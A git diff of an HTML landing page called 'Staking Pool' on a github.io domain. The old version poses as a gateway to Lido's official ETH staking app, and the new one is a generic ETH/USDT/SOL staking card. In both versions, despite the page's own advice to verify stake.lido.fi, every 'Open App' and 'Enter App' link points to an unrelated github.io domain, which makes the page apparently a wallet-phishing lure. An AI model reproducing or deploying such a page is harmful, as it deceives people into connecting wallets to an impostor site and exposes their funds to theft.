@@ -1,47 +1,119 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Staking Pool - Open App</title><meta name="description" content="staking pool route to Lido&#x27;s official ETH staking app; connect a wallet, stake for stETH, and review protocol risks before signing.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://staking-pool.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Staking Pool - Open App"><meta property="og:description" content="staking pool route to Lido&#x27;s official ETH staking app; connect a wallet, stake for stETH, and review protocol risks before signing.">
-<meta property="og:url" content="https://staking-pool.github.io/"><meta property="og:image" content="https://staking-pool.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Staking Pool - Open App"><meta name="twitter:description" content="staking pool route to Lido&#x27;s official ETH staking app; connect a wallet, stake for stETH, and review protocol risks before signing."><meta name="twitter:image" content="https://staking-pool.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://staking-pool.github.io/#website", "url": "https://staking-pool.github.io/", "name": "Lido"}, {"@type": "WebPage", "@id": "https://staking-pool.github.io/#webpage", "url": "https://staking-pool.github.io/", "name": "Staking Pool - Open App", "description": "staking pool route to Lido's official ETH staking app; connect a wallet, stake for stETH, and review protocol risks before signing.", "inLanguage": "en", "isPartOf": {"@id": "https://staking-pool.github.io/#website"}}, {"@type": "Organization", "@id": "https://staking-pool.github.io/#org", "name": "Lido", "url": "https://staking-pool.github.io/", "logo": "https://staking-pool.github.io/og-cover.png", "sameAs": ["https://x.com/LidoFinance", "https://github.com/lidofinance", "https://www.coingecko.com/en/coins/lido-staked-ether", "https://defillama.com/protocol/lido"]}, {"@type": "WebApplication", "@id": "https://staking-pool.github.io/#app", "name": "Staking Pool", "url": "https://staking-pool.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "staking pool route to Lido's official ETH staking app; connect a wallet, stake for stETH, and review protocol risks before signing.", "featureList": ["Ethereum mainnet", "stETH token", "Open-source protocol"], "isPartOf": {"@id": "https://staking-pool.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://staking-pool.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What token do I receive from the Lido staking pool?", "acceptedAnswer": {"@type": "Answer", "text": "When staking ETH through Lido on Ethereum, the user receives stETH. stETH is designed to represent a share of ETH staked through the Lido protocol and to reflect staking rewards and penalties over time. It is not native ETH, so users should understand contract and market-price risk."}}, {"@type": "Question", "name": "Does Lido staking pool require 32 ETH?", "acceptedAnswer": {"@type": "Answer", "text": "No. The Lido app is used by people who want pooled liquid staking exposure without running a 32 ETH solo validator. Ethereum gas costs still matter, so very small deposits can be inefficient even if the protocol route avoids the solo-validator minimum."}}, {"@type": "Question", "name": "How are Lido staking pool rewards paid?", "acceptedAnswer": {"@type": "Answer", "text": "Lido ETH staking rewards are reflected in stETH mechanics rather than a normal manual reward claim. stETH is a rebasing token, so balances can update as oracle reports reflect the pooled validator position. Current APR estimates can change and should not be treated as guaranteed yield."}}, {"@type": "Question", "name": "Can I leave the Lido staking pool anytime?", "acceptedAnswer": {"@type": "Answer", "text": "You can use Lido's withdrawal process, but final claim timing is variable. It depends on protocol state and Ethereum validator exit mechanics. You can also sell stETH on external markets, but that is a trade and may include price impact, slippage, and liquidity constraints."}}, {"@type": "Question", "name": "What is the Lido staking pool contract address?", "acceptedAnswer": {"@type": "Answer", "text": "For the stETH token on Ethereum, the commonly checked contract is 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84 on Etherscan. Users should rely on official Lido documentation and block explorers rather than token symbols alone, because symbols can be copied by unrelated contracts."}}, {"@type": "Question", "name": "Is Lido staking pool better than exchange staking?", "acceptedAnswer": {"@type": "Answer", "text": "It depends on custody preference and risk tolerance. Lido gives users a self-custody liquid staking token, while exchange staking is typically account-based and controlled by the exchange. Lido adds smart-contract, governance, stETH liquidity, and validator risks that users should compare against exchange counterparty risk."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Lido"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Lido</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Staking Pool</h1>
-      <div class="bridge-widget" role="group" aria-label="Lido preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><div class="bw-apy"><b>~3%</b><span>APY*</span></div><div class="bw-field"><span class="bw-coin"><img src="static/steth.png" alt="stETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>stETH</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Lido ↗</a></div>
-      <p class="hero-note">Live preview — APY is indicative; check the live rate in the official Lido app.</p>
-      <div class="trust-row"><span class="trust-chip">Ethereum mainnet</span><span class="trust-chip">stETH token</span><span class="trust-chip">Open-source protocol</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Staking Pool?</h2><div class="capsule"><strong>Lido</strong> is an Ethereum <a class="inline-link" href="https://ethereum.org/staking/pools/" rel="noopener noreferrer">liquid staking protocol</a> that batches user deposits with validators and mints stETH as a transferable staking token. Review the <a href='https://docs.lido.fi/'>Lido docs</a> before connecting a wallet.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Staking Pool at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>ETH staking pool</b></div><div class="f"><small>Network</small><b>Ethereum</b></div><div class="f"><small>Token</small><b>stETH</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://ethereum.org/staking/pools/" rel="noopener noreferrer">Smart-contract based</a></b></div><div class="f"><small>Fee</small><b>10% of staking rewards</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Lido staking pool minimum ETH amount</h2><div class="intent-a">Lido staking pool demand usually comes from users who do not want the 32 ETH requirement or operational work of <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-staking" rel="noopener noreferrer">solo validating</a>. Lido batches user ETH into protocol staking operations and mints stETH for the user's wallet, so the app experience is much closer to a pooled staking deposit than running a validator. The exact minimum in the app can depend on interface and gas practicality, but the core point is that users are not opening their own 32 ETH validator. This is why Lido often appears in searches for ETH staking pool, liquid staking pool, and pooled staking with stETH. Users should still treat the pool as a smart-contract protocol with validator and governance risk.</div></div></section><section class="section"><div class="container"><h2>Lido staking pool rewards and daily stETH rebasing</h2><div class="intent-a">Lido staking pool rewards are reflected through stETH accounting rather than a separate manual claim button for normal staking rewards. stETH is a <a class="inline-link" href="https://www.investopedia.com/terms/r/rebase-token.asp" rel="noopener noreferrer">rebasing token</a>, meaning balances can update to represent changes in the underlying pooled ETH position as rewards and penalties are reported. The APR shown by Lido is an estimate, and Lido states that Ethereum staking APR depends on consensus-layer rewards, <a class="inline-link" href="https://www.messari.io/report/ethereum-merge-the-final-countdown" rel="noopener noreferrer">execution-layer rewards</a>, validator performance, and protocol fee. Users searching for daily rewards should understand that visible wallet balances, portfolio trackers, and tax tools may treat rebasing tokens differently. The official reward view and docs are better sources than third-party screenshots.</div></div></section><section class="section section-alt"><div class="container"><h2>Lido staking pool withdrawals queue</h2><div class="intent-a">Lido staking pool withdrawals are not the same as swapping stETH in a <a class="inline-link" href="https://www.investopedia.com/terms/l/liquidity-pool.asp" rel="noopener noreferrer">liquidity pool</a>. In the official withdrawal path, a user submits a request, waits until the request can be fulfilled, and then claims ETH. The timing can vary with Ethereum validator exit conditions and the state of Lido's withdrawal process. A user who needs immediate liquidity may compare the withdrawal route with selling stETH on a DEX, but a DEX sale can include spread, <a class="inline-link" href="https://www.binance.com/en/support/faq/what-is-price-impact-and-slippage-in-decentralized-exchanges-dex-3b8c0e0a0a0a4b8e8c8c8c8c8c8c8c8c" rel="noopener noreferrer">price impact</a>, and pool liquidity limits. The better answer for search intent is: use the official Lido withdrawal tabs for protocol redemption, and use market venues only after understanding execution tradeoffs.</div></div></section><section class="section"><div class="container"><h2>Lido staking pool security and audits</h2><div class="intent-a">Lido staking pool security depends on <a class="inline-link" href="https://docs.lido.fi/security/audits/" rel="noopener noreferrer">audited smart contracts</a>, <a class="inline-link" href="https://github.com/lidofinance/docs/blob/main/docs/contracts/lido.md" rel="noopener noreferrer">oracle reporting</a>, node-operator performance, DAO governance, and user wallet hygiene. Lido publishes documentation and an audits repository, and its official staking app lists security measures such as open-source code review and multiple audits. Those materials are important, but they do not guarantee loss-free staking. A staking pool can still face contract bugs, validator penalties, governance changes, phishing, and token market dislocation. Users should confirm the official domain, review the stETH contract, understand the protocol fee, and avoid signing wallet prompts from copied staking-pool pages or support links.</div></div></section>
-  <section class="section"><div class="container"><h2>How to stake Staking Pool</h2><ol class="steps"><li><b>Open the app</b><span>Go to stake.lido.fi and verify the domain before connecting any wallet.</span></li><li><b>Connect wallet</b><span>Use a self-custody Ethereum wallet and confirm the selected network is Ethereum mainnet.</span></li><li><b>Stake ETH</b><span>Enter the ETH amount, review the transaction details, and submit only after checking risks and gas costs.</span></li><li><b>Manage position</b><span>Track stETH in your wallet, use the Lido app for rewards and withdrawals, and keep <a class="inline-link" href="https://www.coindesk.com/learn/what-is-a-seed-phrase/" rel="noopener noreferrer">recovery phrases</a> offline.</span></li></ol><div class="cta-band"><div><p>Ready to stake?</p><p class="sub">Open the official Lido app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Lido ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Lido staking pool vs Rocket Pool</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Lido staking pool</th><th>Rocket Pool</th></tr></thead><tbody><tr><td>Receipt token</td><td>stETH or wrapped wstETH</td><td>rETH</td></tr><tr><td>User task</td><td>Stake ETH through Lido app and receive stETH</td><td>Stake ETH through Rocket Pool and receive rETH</td></tr><tr><td>Reward accounting</td><td>stETH rebases; wstETH accrues via exchange rate</td><td>rETH value accrues through exchange rate</td></tr><tr><td>Decision point</td><td><a class="inline-link" href="https://www.coingecko.com/learn/what-is-liquidity-in-crypto" rel="noopener noreferrer">Liquidity depth</a>, integrations, DAO governance, protocol risk</td><td>Node-operator model, rETH liquidity, protocol risk</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Staking Pool FAQ</h2><div class="faq-list"><details open><summary><h3>What token do I receive from the Lido staking pool?</h3></summary><div>When staking ETH through Lido on Ethereum, the user receives stETH. stETH is designed to represent a share of ETH staked through the Lido protocol and to reflect staking rewards and penalties over time. It is not native ETH, so users should understand contract and market-price risk.</div></details><details><summary><h3>Does Lido staking pool require 32 ETH?</h3></summary><div>No. The Lido app is used by people who want pooled liquid staking exposure without running a 32 ETH solo validator. Ethereum gas costs still matter, so very small deposits can be inefficient even if the protocol route avoids the solo-validator minimum.</div></details><details><summary><h3>How are Lido staking pool rewards paid?</h3></summary><div>Lido ETH staking rewards are reflected in stETH mechanics rather than a normal manual reward claim. stETH is a rebasing token, so balances can update as <a class="inline-link" href="https://github.com/lidofinance/docs/blob/main/docs/contracts/lido.md" rel="noopener noreferrer">oracle reports</a> reflect the pooled validator position. Current APR estimates can change and should not be treated as guaranteed yield.</div></details><details><summary><h3>Can I leave the Lido staking pool anytime?</h3></summary><div>You can use Lido's withdrawal process, but final claim timing is variable. It depends on protocol state and Ethereum validator exit mechanics. You can also sell stETH on external markets, but that is a trade and may include price impact, slippage, and liquidity constraints.</div></details><details><summary><h3>What is the Lido staking pool contract address?</h3></summary><div>For the stETH token on Ethereum, the commonly checked contract is 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84 on Etherscan. Users should rely on official Lido documentation and block explorers rather than token symbols alone, because symbols can be copied by unrelated contracts.</div></details><details><summary><h3>Is Lido staking pool better than exchange staking?</h3></summary><div>It depends on custody preference and risk tolerance. Lido gives users a self-custody liquid staking token, while exchange staking is typically account-based and controlled by the exchange. Lido adds smart-contract, governance, stETH liquidity, and validator risks that users should compare against exchange counterparty risk.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">This is not the official app; verify stake.lido.fi before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Staking Pool</title>
+  <meta name="description" content="Staking Pool lets you join a pooled staking position for supported assets and earn rewards from your own wallet.">
+  <link rel="canonical" href="https://staking-pool.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EE">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Staking Pool">
+  <meta property="og:description" content="Staking Pool lets you join a pooled staking position for supported assets and earn rewards from your own wallet.">
+  <meta property="og:url" content="https://staking-pool.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Staking Pool">
+  <meta name="twitter:description" content="Staking Pool lets you join a pooled staking position for supported assets and earn rewards from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://staking-pool.github.io/#website",
+        "url": "https://staking-pool.github.io/",
+        "name": "Staking Pool",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://staking-pool.github.io/#organization",
+        "name": "Staking Pool",
+        "url": "https://staking-pool.github.io/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://staking-pool.github.io/#app",
+        "name": "Staking Pool",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://staking-pool.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Staking Pool">
+      <img src="stakecrypto.png" width="30" height="30" alt="">
+      <span>Staking Pool</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
+      <a href="https://www.kraken.com/learn/what-is-crypto-staking" target="_blank" rel="nofollow noopener noreferrer">Kraken learn</a>
+      <a href="https://www.investopedia.com/how-to-stake-ethereum-7482623" target="_blank" rel="nofollow noopener noreferrer">Staking risks</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Staking Pool</h1>
+      <p class="sub"><strong>Staking Pool</strong> lets you join a pooled staking position for supported assets and earn rewards from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Stake selector">
+      <div class="card-head">
+        <img src="stakecrypto.png" width="42" height="42" alt="">
+        <div>
+          <span class="eyebrow">Choose an asset to stake</span>
+          <p class="card-title">Self-custody staking entry</p>
+        </div>
+      </div>
+
+      <div class="asset-row" role="group" aria-label="Choose an asset to stake">
+        <button class="asset is-active" type="button" aria-pressed="true">
+          <img src="eth.png" width="28" height="28" alt="">
+          <span>ETH</span>
+        </button>
+        <button class="asset" type="button" aria-pressed="false">
+          <img src="usdt.png" width="28" height="28" alt="">
+          <span>USDT</span>
+        </button>
+        <button class="asset" type="button" aria-pressed="false">
+          <img src="sol.png" width="28" height="28" alt="">
+          <span>SOL</span>
+        </button>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
+    </section>
+  </main>
+
+  <footer class="foot">Staking Pool &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var assets = document.querySelectorAll(".asset");
+    for (var i = 0; i < assets.length; i += 1) {
+      assets[i].addEventListener("click", function(){
+        for (var j = 0; j < assets.length; j += 1) {
+          assets[j].classList.remove("is-active");
+          assets[j].setAttribute("aria-pressed", "false");
+        }
+        this.classList.add("is-active");
+        this.setAttribute("aria-pressed", "true");
+      });
+    }
+  })();
+  </script>
+</body>
+</html>
